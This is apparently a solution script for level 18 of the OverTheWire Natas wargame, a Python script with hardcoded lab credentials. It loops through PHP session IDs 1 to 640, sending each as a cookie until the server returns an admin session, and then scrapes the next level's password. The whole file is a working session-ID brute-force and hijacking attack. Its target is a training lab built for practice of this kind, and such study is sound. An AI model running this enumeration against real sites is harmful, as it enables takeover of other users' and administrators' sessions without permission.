import requests
import re
import string
from time import *


username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()


for session_id in range(1, 641):
	response = session.get(url, cookies={"PHPSESSID": str(session_id)}, auth = (username, password))
	content = response.text
	
	if "You are an admin" in content:
		print(re.findall('Password: (.*)</pre>', content)[0])
		break



